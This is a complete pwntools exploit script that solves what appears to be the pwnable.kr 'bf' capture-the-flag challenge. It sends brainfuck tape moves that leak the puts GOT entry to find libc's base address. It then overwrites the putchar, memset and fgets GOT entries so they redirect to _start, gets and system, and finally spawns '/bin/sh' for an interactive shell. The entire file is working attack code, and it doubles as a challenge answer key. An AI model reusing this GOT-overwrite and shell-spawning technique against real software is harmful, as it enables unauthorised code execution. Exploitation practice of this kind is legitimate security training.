from pwn import *

e = ELF('./bf')
tape = 0x804a0a0
got_memset = e.got['memset']
got_puts = e.got['puts']
got_fgets = e.got['fgets']
got_putchar = e.got['putchar']
start = e.symbols['_start']

libc = ELF('./libc32-2.24.so')
#libc = ELF('./bf_libc.so')
offset_memset = libc.symbols['memset']
offset_gets = libc.symbols['gets']
offset_puts = libc.symbols['puts']
offset_system = libc.symbols['system']

p = process('./bf')
#p = remote('pwnable.kr', 9001)
print p.recvuntil('type some brainfuck instructions except [ ]')      # Clean up read buffer prevent wrong puts address being read later on
print p.recv(timeout=1)                                               # There's newline left in the input stream, eat it up

payload = '<' * (tape - got_puts)                   # Reset the tape head to the beginning of puts GOT entry
payload += '.>.>.>.'                                # Leak memset address
payload += '>' * (got_putchar - (got_puts + 3))     # Reset the tape head to the beginning of putchar GOT entry
payload += ',>,>,>,'                                # Make putchar GOT point to _start
payload += '<' * ((got_putchar + 3) - got_memset)   # Reset the tape head to the beginning of memset GOT entry
payload += ',>,>,>,'                                # Make memset GOT point to gets
payload += '<' * ((got_memset + 3) - got_fgets)     # Reset the tape head to the beginning of fgets GOT entry
payload += ',>,>,>,'                                # Make fgets GOT point to system
payload += '.'                                      # Trigger a putchar call

print payload
p.sendline(payload)

puts_addr = p.readn(4)
print puts_addr
puts_addr = unpack(puts_addr)
libc_base = puts_addr - offset_puts
gets_addr = libc_base + offset_gets
system_addr = libc_base + offset_system

p.send(p32(start))                                  # Make putchar GOT point to _start
p.send(p32(gets_addr))
p.send(p32(system_addr))
p.sendline('/bin/sh\x00')
print p.recv()
p.interactive()